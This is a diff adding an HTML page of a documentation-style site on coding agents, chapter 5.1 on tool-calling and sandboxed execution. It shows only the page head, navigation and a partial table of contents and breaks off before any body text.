@@ -1,0 +1,3542 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="A Strossian future history of the Boris era — the definitive guide to coding agents and agentic harnesses.">
+      
+      
+        <meta name="author" content="Acceleralpho">
+      
+      
+      
+        <link rel="prev" href="../../part2/4.3%20Refactoring%20the%20Past%20Legacy%20C%2B%2B%20via%20Agentic%20Threads/">
+      
+      
+        <link rel="next" href="../5.2%20OpenRouter%20The%20Switzerland%20of%20the%20Model%20Wars/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.5">
+    
+    
+      
+        <title>5.1 Leashing the Beast: Tool-Calling and Sandboxed Execution - Acceleralpho: Evolution of Coding Agents and Agentic Harnesses</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="deep-purple">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#51-leashing-the-beast-tool-calling-and-sandboxed-execution" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Acceleralpho: Evolution of Coding Agents and Agentic Harnesses" class="md-header__button md-logo" aria-label="Acceleralpho: Evolution of Coding Agents and Agentic Harnesses" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Acceleralpho: Evolution of Coding Agents and Agentic Harnesses
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              5.1 Leashing the Beast: Tool-Calling and Sandboxed Execution
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="deep-purple"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="deep-purple"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../table-of-contents/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Table of Contents
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../part1/1.1%20The%20Great%20IDE%20Exodus/" class="md-tabs__link">
+          
+  
+  
+  Part I: The Pre-Cambrian Explosion
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../part2/3.1%20Steve%20Yegge%20High-Throughput%20Agentic%20Environments/" class="md-tabs__link">
+          
+  
+  
+  Part II: The Architectural Sovereigns
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="./" class="md-tabs__link">
+          
+  
+  
+  Part III: The Harnesses and the Hyperscalers
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../part4/7.1%20DeepSeek%20and%20Qwen%20Shattering%20the%20Western%20Moat/" class="md-tabs__link">
+          
+  
+  
+  Part IV: Global Shifting and Open Frontiers
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../part5/9.1%20Self-Healing%20Codebases%20and%20Autonomous%20Bug-Hunting/" class="md-tabs__link">
+          
+  
+  
+  Part V: The Acceleralpho Horizon
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../references/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  References
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Acceleralpho: Evolution of Coding Agents and Agentic Harnesses" class="md-nav__button md-logo" aria-label="Acceleralpho: Evolution of Coding Agents and Agentic Harnesses" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Acceleralpho: Evolution of Coding Agents and Agentic Harnesses
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../table-of-contents/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Table of Contents
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Part I: The Pre-Cambrian Explosion
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Part I: The Pre-Cambrian Explosion
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter 1: The Terminal is the Universe
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Chapter 1: The Terminal is the Universe
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part1/1.1%20The%20Great%20IDE%20Exodus/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    1.1 The Great IDE Exodus
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part1/1.2%20Claude%20Code%20The%20Boris%20Persona/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    1.2 Claude Code — The Boris Persona
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part1/1.3%20The%20UX%20of%20Autonomy/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    1.3 The UX of Autonomy
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter 2: The Ralph Wiggum Loop
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Chapter 2: The Ralph Wiggum Loop
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part1/2.1%20I%27m%20in%20Danger%20Feedback%20Loops/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2.1 I'm in Danger Feedback Loops
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part1/2.2%20Recursive%20Failure/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2.2 Recursive Failure
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part1/2.3%20The%20Proverbial%20Glue/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2.3 The Proverbial Glue
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Part II: The Architectural Sovereigns
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Part II: The Architectural Sovereigns
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_1" id="__nav_4_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter 3: Gas Town and the Context Engines
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Chapter 3: Gas Town and the Context Engines
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part2/3.1%20Steve%20Yegge%20High-Throughput%20Agentic%20Environments/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    3.1 Steve Yegge's Vision: High-Throughput Agentic Environments
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part2/3.2%20Beyond%20RAG%20The%20Infinite%20Window/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    3.2 Beyond RAG: The Infinite Window
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part2/3.3%20Cody%20and%20the%20Context%20Power%20Plant/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    3.3 Cody and the Context Power Plant
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_2" id="__nav_4_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter 4: Loom — The Agentic Operating System
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Chapter 4: Loom — The Agentic Operating System
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part2/4.1%20LLMs%20as%20First-Class%20OS%20Citizens/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    4.1 LLMs as First-Class OS Citizens
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part2/4.2%20Orchestration%20vs%20Execution%20The%20Loom%20Framework/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    4.2 Orchestration vs. Execution: The Loom Framework
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part2/4.3%20Refactoring%20the%20Past%20Legacy%20C%2B%2B%20via%20Agentic%20Threads/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    4.3 Refactoring the Past: Legacy C++ via Agentic Threads
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Part III: The Harnesses and the Hyperscalers
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Part III: The Harnesses and the Hyperscalers
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_1" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_5_1" id="__nav_5_1_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter 5: The Harness Wars
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_5_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Chapter 5: The Harness Wars
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    5.1 Leashing the Beast: Tool-Calling and Sandboxed Execution
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    5.1 Leashing the Beast: Tool-Calling and Sandboxed Execution
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#why-this-section-matters" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Why this section matters
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#deliverable" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Deliverable
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#concept-loop-1-why-raw-models-are-useless-without-leashes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Concept loop 1: Why raw models are useless without leashes
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Concept loop 1: Why raw models are useless without leashes">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#concept" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Concept
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#worked-example" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Worked example
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#example-5-1-the-inert-model-vs-the-tool-equipped-agent" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Example 5-1. The inert model vs. the tool-equipped agent
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#check-yourself" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Check yourself
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#concept-loop-2-tool-calling-fundamentals" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Concept loop 2: Tool-calling fundamentals
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Concept loop 2: Tool-calling fundamentals">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#concept_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Concept
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#worked-example_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Worked example
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#example-5-2-tool-schemas-for-a-minimal-coding-agent" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Example 5-2. Tool schemas for a minimal coding agent
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#check-yourself_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Check yourself
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#concept-loop-3-sandboxed-execution" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Concept loop 3: Sandboxed execution
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Concept loop 3: Sandboxed execution">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#concept_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Concept
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#worked-example_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Worked example
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#example-5-3-sandboxed-code-execution-with-docker" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Example 5-3. Sandboxed code execution with Docker
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#check-yourself_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Check yourself
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#concept-loop-4-the-harness-pattern-assembling-the-full-loop" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Concept loop 4: The harness pattern — assembling the full loop
+      
+    </span>
+  </a>
+  
